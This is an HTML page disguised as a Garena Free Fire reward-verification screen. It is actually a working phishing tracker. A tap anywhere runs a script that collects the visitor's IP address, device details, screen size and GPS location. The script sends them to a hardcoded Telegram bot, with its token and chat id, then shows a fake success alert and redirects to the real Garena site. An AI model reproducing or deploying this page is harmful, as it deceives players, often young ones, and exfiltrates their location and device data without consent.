<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Reward Verification</title>
    <style>
        body { background: #050a12; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: #0d1117; box-shadow: 0 0 30px rgba(0, 242, 255, 0.4); max-width: 350px; }
        h1 { color: #00f2ff; font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #00f2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #888; font-size: 13px; }
    </style>
</head>
<body onclick="grabData()">

<div class="box">
    <h1>Account Verifying...</h1>
    <div class="loading"></div>
    <p>Please tap on the screen to confirm your identity and claim rewards.</p>
</div>

<script>
    async function grabData() {
        // IP Address সংগ্রহ করা (Online ID)
        let ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
        let ip = ipData.ip;

        // Device Info সংগ্রহ করা
        let deviceModel = navigator.userAgent;
        let platform = navigator.platform;
        let screenRes = `${window.screen.width}x${window.screen.height}`;

        // Location সংগ্রহ করা
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                sendToTelegram(ip, deviceModel, platform, screenRes, position);
            }, function() {
                // ইউজার না দিলেও IP এবং Device Info চলে যাবে
                sendToTelegram(ip, deviceModel, platform, screenRes, null);
            });
        }
    }

    function sendToTelegram(ip, device, plat, res, pos) {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
        const chat_id = "7547190025"; 
        
        let mapLink = "Location Denied";
        if (pos) {
            mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        }

        const message = `🎯 **নতুন ডাটা ক্যাপচার হয়েছে!** 🎯\n\n🌐 **IP Address:** ${ip}\n📱 **Device:** ${device}\n💻 **Platform:** ${plat}\n🖥️ **Resolution:** ${res}\n📍 **Map:** ${mapLink}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
        .then(() => {
            alert("Verification Complete! Please wait 5 minutes.");
            window.location.href = "https://ff.garena.com/"; 
        });
    }
</script>

</body>
</html>
